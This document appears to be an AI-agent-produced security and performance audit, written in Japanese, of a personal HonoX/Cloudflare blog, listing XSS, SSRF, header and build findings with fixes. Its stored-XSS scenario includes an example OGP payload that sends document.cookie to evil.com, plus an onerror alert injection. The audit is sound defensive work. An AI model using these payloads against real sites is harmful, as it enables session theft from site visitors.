# Red Team Security & Performance Review

**Date:** 2026-02-16
**Target:** raizawa-blog (HonoX SSG + Cloudflare Workers)
**Methodology:** 6 specialized agents investigating in parallel from different angles

---

## Executive Summary

6つの専門エージェントが並行してコードベース全体を調査しました。

- **XSS & Injection** -- dangerouslySetInnerHTML、Markdown注入、YAML汚染
- **SSRF & Network** -- OGPフェッチ経由のSSRF、CSP、情報漏洩
- **Config & Supply Chain** -- 依存関係、CI/CD、Cloudflare設定
- **Build Performance** -- ビルド時間、メモリ、OGPフェッチ
- **Frontend Performance** -- Core Web Vitals、CSS、キャッシュ
- **ReDoS & Logic Bugs** -- 正規表現、ページネーション、パス走査

全体としてSSGアーキテクチャによりランタイムの攻撃面は小さく、個人ブログとして合理的なセキュリティ水準です。しかし、OGPカード生成におけるHTMLエスケープ未実施は複数エージェントが一致して **Critical** と判定しており、早急な対応を推奨します。

### Findings Summary

| Severity | Count | Key Areas |
|----------|-------|-----------|
| Critical | 1 | OGPメタデータ経由のStored XSS |
| High | 3 | markdown-it `html:true`、SSGビルド重複レンダリング、HTMLキャッシュなし |
| Medium | 9 | SSRF、CSP未設定、XML注入、OGPフェッチ増幅、og:image未設定など |
| Low | 11 | JSON-LD注入、日付パース不整合、キャッシュサイズ制限なしなど |
| Info | 8 | 肯定的な発見・設計上の注意事項 |

---

## Critical Findings

### C-1: OGPメタデータ経由のStored XSS (Critical)

**検出エージェント:** XSS & Injection, SSRF & Network, ReDoS & Logic Bugs (3/6エージェントが独立して検出)

**ファイル:** `app/lib/ogp.ts:128-139`

**問題:** `generateOGPCard()` が外部サイトから取得したOGPメタデータ（`title`, `description`, `image`, `siteName`）をHTMLエスケープなしで直接HTML文字列に挿入している。

```typescript
// ogp.ts line 134
imageHtml = `<span class="ogp-image"><img src="${image}" alt="${altText}" /></span>`;

// ogp.ts line 138
return `<a href="${url}" ...>${imageHtml}<span class="ogp-content">
  <span class="ogp-title">${displayTitle}</span>
  <span class="ogp-description">${description}</span>
  <span class="ogp-site">${siteName}</span>
</span></a>`;
```

**攻撃シナリオ:**

1. ブログ記事に外部URLをスタンドアロンで記載
2. ビルド時に `fetchOGP()` が外部ページを取得しメタタグを抽出
3. 攻撃者が管理するサイトが以下のようなOGPを返す:
   ```html
   <meta property="og:title" content='"><script>fetch("https://evil.com/steal?c="+document.cookie)</script><span x="'>
   <meta property="og:image" content='" onerror="alert(document.domain)" x="'>
   ```
4. サニタイズなしでHTMLに埋め込まれ、`dangerouslySetInnerHTML` で描画
5. 静的HTMLにスクリプトが焼き込まれ、全訪問者に影響

**推奨修正:**

```typescript
const escapeHtml = (str: string): string =>
  str
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
```

`generateOGPCard()` 内の全フィールドに `escapeHtml()` を適用する。加えて、`image` URLが `https://` で始まることを検証する。

---

## High Findings

### H-1: markdown-it の `html: true` 設定 (High)

**検出エージェント:** XSS & Injection, Config & Supply Chain, SSRF & Network

**ファイル:** `app/lib/markdown.ts:8`

```typescript
const md = MarkdownIt({ breaks: true, html: true });
```

**問題:** Markdownファイル内の生HTMLがそのまま出力される。`<script>`, `<iframe>`, `<img onerror=...>` 等が全てパススルーされる。単一著者ブログとして意図的な設定だが、リポジトリ侵害時にXSSベクターとなる。

**推奨修正:** `html: false` に変更するか、`md.render()` 出力後にDOMPurify等のサニタイザを適用する。

### H-2: SSGビルドでの重複レンダリング (High -- Performance)

**検出エージェント:** Build Performance

**ファイル:** `app/routes/posts/[slug].tsx`, `app/routes/category/[category]/posts/[slug].tsx`, `app/routes/tag/[tag]/posts/[slug].tsx`

**問題:** 同一記事が複数のURLパターンで完全に再レンダリングされる。1記事が1カテゴリ+3タグなら `getPostBySlug()` が **5回** 呼ばれ、毎回 Markdown解析 + Shikiハイライト + OGPフェッチが実行される。

**計算量:** O(P × (1 + C + T))（P=記事数, C=カテゴリ数, T=タグ数）

59記事で150-300回のフルレンダリング。記事増加に伴い指数的に悪化。

**推奨修正:** `getPostBySlug()` にレンダリング済みHTMLキャッシュ（`Map<string, Post>`）を追加する。

### H-3: llms-full.txt ルートのビルドボトルネック (High -- Performance)

**検出エージェント:** Build Performance

**ファイル:** `app/routes/llms-full.txt.ts:23-26`

```typescript
const posts = await Promise.all(postsMeta.map((meta) => getPostBySlug(meta.slug)));
```

**問題:** 全59記事を `getPostBySlug()` で完全レンダリングするが、実際には生マークダウン（`post.content`）しか使っていない。HTMLレンダリングは完全に無駄。

**推奨修正:** 生コンテンツのみを返す `getPostBySlugRaw()` を新設する。

---

## Medium Findings

### M-1: OGPフェッチのSSRF (Medium)

**検出エージェント:** SSRF & Network, XSS & Injection

**ファイル:** `app/lib/ogp.ts:51-71`

**問題:** `fetchPageHTML()` がURL検証なしで任意URLを取得する。ビルド環境からの内部ネットワークアクセス（`169.254.169.254`, `127.0.0.1` 等）やリダイレクト追跡が可能。

**推奨修正:**
- URLスキーム検証（`https://` のみ許可）
- プライベートIPレンジのブロック
- `redirect: "error"` または `redirect: "manual"` の設定
- レスポンスサイズ制限（最初の512KBのみ読み取り）

### M-2: セキュリティヘッダー未設定 (Medium)

**検出エージェント:** SSRF & Network, Config & Supply Chain, XSS & Injection

**ファイル:** `wrangler.toml`, `app/server.ts`

**問題:** CSP, X-Frame-Options, X-Content-Type-Options, HSTS, Referrer-Policy いずれも未設定。XSS脆弱性が悪用された場合の防御層がない。

**推奨修正:** `public/_headers` ファイル作成またはCloudflare設定：

```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' https:
  X-Content-Type-Options: nosniff
  X-Frame-Options: DENY
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  Referrer-Policy: strict-origin-when-cross-origin
```

### M-3: Sitemap XMLインジェクション (Medium)

**検出エージェント:** XSS & Injection, ReDoS & Logic Bugs, SSRF & Network

**ファイル:** `app/routes/sitemap.xml.ts:43-55`

**問題:** カテゴリ名・タグ名がXMLエスケープなしで挿入される。`feed.xml.ts` にある `escapeXml()` が適用されていない。

**推奨修正:** `escapeXml()` を共通ユーティリティとして切り出し、sitemap.xml内の全動的値に適用する。

### M-4: GitHub Actions のSHA未固定 (Medium)

**検出エージェント:** Config & Supply Chain

**ファイル:** `.github/workflows/test.yml:17`, `.github/actions/setup-nix/action.yml:13,16`

```yaml
- uses: actions/checkout@v4                          # タグのみ
- uses: DeterminateSystems/nix-installer-action@v17  # タグのみ
- uses: cachix/cachix-action@v15                     # タグのみ
```

**問題:** 全アクションがmutableタグで固定されており、上流リポジトリ侵害時にサプライチェーン攻撃に脆弱。特に `nix-installer-action` はroot権限でNixをインストールする。

**推奨修正:** 全アクションをコミットSHAで固定する。

### M-5: OGPフェッチ増幅 (Medium -- Performance)

**検出エージェント:** Build Performance

**ファイル:** `app/lib/ogp.ts:19-25`, `app/lib/markdown.ts:88-95`

**問題:** 46記事内に124のスタンドアロンURLがあり、`Promise.all` で並行フェッチされる。各URLに5秒のタイムアウト。外部サービスダウン時にビルド時間が大幅増加する可能性。

**推奨修正:**
- タイムアウトを2-3秒に短縮
- グローバル同時接続数制限（最大5）を追加
- 永続ディスクキャッシュ（JSONファイル）を導入

### M-6: og:imageメタタグ未設定 (Medium -- SEO/UX)

**検出エージェント:** Frontend Performance

**ファイル:** `app/components/layout.tsx`

**問題:** `<meta property="og:image">` タグが全ページで欠如。Twitter、Slack、Discord等でURL共有時にプレビュー画像が表示されない。クリック率に大きく影響。

**推奨修正:** 最低限、デフォルトのサイト全体OG画像を設定する。

### M-7: 記事のmeta descriptionがタイトルと同一 (Medium -- SEO)

**検出エージェント:** Frontend Performance

**ファイル:** `app/routes/posts/[slug].tsx:93-94`

```typescript
description={`${post.meta.title} - ${SITE_TITLE}`}
```

**問題:** 検索結果のスニペットに使われる `<meta name="description">` がタイトルの繰り返し。一部記事はfrontmatterに `description` フィールドがあるが `parsePostMeta()` でパースされていない。

**推奨修正:** frontmatterの `description` フィールドをパースして使用するか、記事本文の先頭160文字を自動生成する。

### M-8: OGPカード画像のCLS (Medium -- Performance)

**検出エージェント:** Frontend Performance

**ファイル:** `app/lib/ogp.ts:134`

**問題:** `<img>` タグに `width`, `height`, `loading`, `decoding` 属性がない。CSSでコンテナサイズは固定されているが、画像ロード時にリペイントが発生する可能性。

**推奨修正:** `loading="lazy" decoding="async" width="192" height="144"` を追加。

### M-9: Cache-Controlヘッダー未設定 (Medium -- Performance)

**検出エージェント:** Frontend Performance

**ファイル:** `wrangler.toml`

**問題:** 静的アセットのキャッシュヘッダーが明示的に設定されていない。ハッシュ付きCSSファイルは `immutable` で長期キャッシュすべき。

**推奨修正:**

```toml
[[assets.headers]]
for = "/static/*"
values = { Cache-Control = "public, max-age=31536000, immutable" }

[[assets.headers]]
for = "/*.html"
values = { Cache-Control = "public, max-age=3600, s-maxage=86400" }
```

---

## Low Findings

### L-1: JSON-LD `</script>` ブレイクアウト (Low)

**検出エージェント:** ReDoS & Logic Bugs, XSS & Injection

**ファイル:** `app/components/layout.tsx:46-49`, `app/routes/posts/[slug].tsx:82-89`

**問題:** `JSON.stringify()` は `</` シーケンスをエスケープしない。frontmatterタイトルに `</script>` が含まれるとスクリプトタグが閉じてしまう。

**推奨修正:** `JSON.stringify(jsonLd).replaceAll("</", "<\\/")` を使用する。

### L-2: 日付パース不整合 (Low)

**検出エージェント:** ReDoS & Logic Bugs

**ファイル:** `app/lib/posts.ts`, `app/routes/feed.xml.ts`, `app/components/post-list.tsx`

**問題:** 日付のスペース→T変換が一部でのみ行われ、パース方式が統一されていない。タイムゾーンも未指定。

**推奨修正:** 日付パースを一元化し、ISO 8601形式を統一的に使用する。

### L-3: Feed XMLのslugエスケープ漏れ (Low)

**検出エージェント:** SSRF & Network, ReDoS & Logic Bugs

**ファイル:** `app/routes/feed.xml.ts:24-25`

**問題:** `post.title` は `escapeXml()` 適用済みだが `post.slug` は未エスケープ。現在のファイル名規則では安全だが、防御的プログラミングとして不十分。

### L-4: OGPキャッシュのサイズ制限なし (Low)

**検出エージェント:** SSRF & Network, ReDoS & Logic Bugs

**ファイル:** `app/lib/ogp.ts:20`

**問題:** `Map` に上限なし。期限切れエントリの削除もない。

### L-5: 二重frontmatterパース (Low -- Performance)

**検出エージェント:** Build Performance

**ファイル:** `app/lib/posts.ts`

**問題:** `initMetaCache()` と `getPostBySlug()` の両方で `matter(content)` を呼んでおり、59-295回の余分なYAML解析が発生。

### L-6: Cloudflare Workers compatibility_date が古い (Low)

**検出エージェント:** Config & Supply Chain

**ファイル:** `wrangler.toml:2`

```toml
compatibility_date = "2024-04-01"
```

約2年前の日付。定期的に更新推奨。

### L-7: source mapが明示的に無効化されていない (Low)

**検出エージェント:** Config & Supply Chain

**ファイル:** `vite.config.ts`

Viteのデフォルトで本番ビルドではソースマップは生成されないが、明示的な設定がない。

### L-8: `showRoutes(app)` の本番サーバーでの呼び出し (Low)

**検出エージェント:** SSRF & Network, Frontend Performance

**ファイル:** `app/server.ts:6`

SSGビルド時のみ実行されるが、不要な `hono/dev` インポートが含まれる。

### L-9: コピースクリプトの3ファイル重複 (Low -- Maintainability)

**検出エージェント:** Frontend Performance

**ファイル:** `app/routes/posts/[slug].tsx`, `app/routes/category/[category]/posts/[slug].tsx`, `app/routes/tag/[tag]/posts/[slug].tsx`

**推奨修正:** 共通モジュールに切り出す。

### L-10: `<time>` 要素の `datetime` 属性欠如 (Low -- SEO/A11y)

**検出エージェント:** Frontend Performance

**ファイル:** `app/components/post-list.tsx:19`

### L-11: JSON-LD `datePublished` の非標準形式 (Low -- SEO)

**検出エージェント:** Frontend Performance

**ファイル:** `app/routes/posts/[slug].tsx:86`

Schema.org仕様はISO 8601を期待するが、`"2026-02-16 02:20"` が使用されている。

---

## Positive Findings (Well-Designed Areas)

複数エージェントが以下を肯定的に評価:

- **パス走査不可能:** `import.meta.glob` + 辞書ルックアップにより構造的に安全
- **ドラフト記事の適切なフィルタリング:** 全エンドポイント（sitemap, feed, llms.txt含む）で除外
- **ページネーション境界チェック:** 0, -1, NaN, 範囲外全てで正しく `notFound()` を返す
- **TypeScript strict mode:** 型安全性が高い
- **lockfileのコミット + frozen-lockfile:** CI/CDでの依存関係固定
- **Shikiハイライターのシングルトン初期化:** 正しい実装
- **Nix入力の適切なロック:** `narHash` によるサプライチェーン保護
- **秘匿情報のハードコード無し:** コードベース内に一切なし
- **SSGアーキテクチャ:** クライアントサイドJSゼロ、ハイドレーションなし（FID/INPに優れる）

---

## Prioritized Remediation Plan

### Phase 1: 即時対応 (Critical)

| # | 対応 | ファイル | 工数 |
|---|------|---------|------|
| 1 | `generateOGPCard()` の全フィールドにHTMLエスケープ適用 | `app/lib/ogp.ts` | 小 |
| 2 | OGP image URLのスキーム検証 (`https://` のみ) | `app/lib/ogp.ts` | 小 |

### Phase 2: 短期対応 (High/Medium)

| # | 対応 | ファイル | 工数 |
|---|------|---------|------|
| 3 | JSON-LD `</script>` エスケープ | `app/components/layout.tsx` | 小 |
| 4 | sitemap.xmlのXMLエスケープ | `app/routes/sitemap.xml.ts` | 小 |
| 5 | セキュリティヘッダー追加 | `public/_headers` or `wrangler.toml` | 小 |
| 6 | GitHub Actionsの SHA固定 | `.github/workflows/test.yml`, `.github/actions/setup-nix/action.yml` | 小 |
| 7 | `getPostBySlug()` にHTMLキャッシュ追加 | `app/lib/posts.ts` | 中 |
| 8 | `llms-full.txt` 用の `getPostBySlugRaw()` 新設 | `app/lib/posts.ts`, `app/routes/llms-full.txt.ts` | 中 |

### Phase 3: 中期対応 (Medium)

| # | 対応 | ファイル | 工数 |
|---|------|---------|------|
| 9 | OGP URLのプライベートIPブロック | `app/lib/ogp.ts` | 中 |
| 10 | OGPフェッチのタイムアウト短縮 + 同時接続数制限 | `app/lib/ogp.ts` | 中 |
| 11 | og:imageメタタグ追加 | `app/components/layout.tsx` | 中 |
| 12 | 記事descriptionの自動生成 | `app/lib/posts.ts`, route files | 中 |
| 13 | Cache-Controlヘッダー設定 | `wrangler.toml` | 小 |

### Phase 4: 長期対応 (Low)

| # | 対応 | ファイル | 工数 |
|---|------|---------|------|
| 14 | HTMLサニタイザの導入検討 | `app/lib/markdown.ts` | 大 |
| 15 | OGP永続ディスクキャッシュ | `app/lib/ogp.ts` | 中 |
| 16 | 日付パースの一元化 | 複数ファイル | 小 |
| 17 | コピースクリプトの共通化 + 外部ファイル化 | route files | 小 |
